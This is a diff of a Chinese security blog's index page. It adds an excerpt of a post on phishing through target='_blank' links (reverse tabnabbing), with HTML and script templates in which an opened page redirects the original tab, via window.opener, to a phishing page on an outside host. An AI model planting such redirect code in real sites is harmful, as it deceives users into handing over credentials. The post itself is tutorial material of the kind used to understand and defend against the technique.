@@ -83,6 +83,62 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/use-blank-attribute-to-fish/">利用_blank属性钓鱼</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-10-12</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E9%92%93%E9%B1%BC">钓鱼</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 _blank _blank是html中的标签属性，如&lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt;, 但若点击HELLO打开的网页1.php中有如下代码：
+&lt;script&gt; if(window.opener){ window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;; } &lt;/script&gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
+0x01 简单模板  a.html内容如下：  &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;   http://xss.reber-9.com/1.php中1.php内容如下：  &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;script&gt; if(window.opener){ window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;hello&lt;/p&gt; &lt;/body&gt; &lt;/html&gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &lt;html&gt; &lt;head&gt; &lt;title&gt;fish&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;This is fishing template!&lt;/h2&gt; &lt;/body&gt; &lt;/html&gt;   点击a.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/use-blank-attribute-to-fish/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/principles/">准则</a></h2>
 
         
@@ -594,65 +650,6 @@
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/sublime-text3-plugins/">Sublime Text 3几个好用的插件</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-09-02</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/other">Other</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/software">software</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 Package Control 安装完这个插件后可以更容易的管理(安装、删除、查看等)其他插件
- 代码安装
-ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(注意单引号)  import urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace(' ','%20')).read())   手动安装
- 点击https://sublime.wbond.net/Package%20Control.sublime-package 下载文件 将下载的文件放在root path/Data/Installed Packages下 重启Sublime Text  使用方法
- Ctrl+Shift+P调出菜单然后选择相应操作  Preferences -&gt; Package Control也可调出  选择Install Package后可以输入想安装的插件名搜索安装    0x01 Emmet 前端必备插件，前身是Zen Coding，可高效编写HTML和CSS(需要依赖PyV8，会自动安装) 
-0x02 Anaconda 可以自动补全并提示语法，还可跳转到定义、使用等 效果如下： 0x03 AutoFileName 快捷输入文件路径 0x04 主题Theme-SoDaReloaded 两个主题插件，安装好之后：首选项 -&gt; 设置-用户，修改文件Packages/User/Preferences.
-    </p>
-
-    
-    <footer>
-        <a href="/posts/sublime-text3-plugins/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -714,7 +711,7 @@ ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(�
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(77)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(78)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -806,7 +803,7 @@ ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>16</sup>
+                <sup>17</sup>
             </p>
         
             <p style="display:inline-block;">
